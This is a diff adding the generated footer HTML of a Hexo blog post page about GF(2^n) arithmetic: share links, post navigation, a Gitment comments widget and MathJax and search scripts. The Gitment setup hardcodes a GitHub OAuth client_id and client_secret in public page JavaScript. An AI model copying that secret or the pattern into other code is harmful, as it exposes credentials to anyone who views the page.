+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《GF 2^n上算术运算的实现》 — H-ZeX&url=https://h-zex.github.io/2018/10/18/My-ITOPS-Note/&via=https://h-zex.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://h-zex.github.io/2018/10/18/My-ITOPS-Note/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2018/10/18/GF-2-n上算术运算的实现/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">GF 2^n上算术运算的实现</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2018/10/18/y-z-mod-n-的所有相关问题的解法/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">$x^y=z(mod\ n) 的所有相关问题的解法$</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitment_thread"></div>
+    <link rel="stylesheet" href="/css/gitment_default.css">
+    <script src="/js/gitment.browser.js"></script>
+    <script>
+        var gitment = new Gitment({
+            owner: 'H-ZeX',
+            repo: 'H-ZeX.github.io',
+            id: 'Thu Oct 18 2018 20:06:10 GMT+0800',
+            oauth: {
+                client_id: '77f9acb63af0afe6c8e9',
+                client_secret: 'e8b9218dee631709a296069a209bad5bb89e6eb3',
+            },
+        })
+        gitment.render('comments')
+    </script>
+</section>
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>H-ZeX &copy; 2017 - 2019</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://h-zex.github.io/2018/10/18/My-ITOPS-Note/&title=《GF 2^n上算术运算的实现》 — H-ZeX&pic=https://h-zex.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://h-zex.github.io/2018/10/18/My-ITOPS-Note/&title=《GF 2^n上算术运算的实现》 — H-ZeX&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://h-zex.github.io/2018/10/18/My-ITOPS-Note/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《GF 2^n上算术运算的实现》 — H-ZeX&url=https://h-zex.github.io/2018/10/18/My-ITOPS-Note/&via=https://h-zex.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://h-zex.github.io/2018/10/18/My-ITOPS-Note/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://h-zex.github.io/2018/10/18/My-ITOPS-Note/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+});
+</script>
+
+<script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = "H-ZeX's Blog";
+            clearTimeout(titleTime);
+        } else {
+            document.title = "H-ZeX's Blog";
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
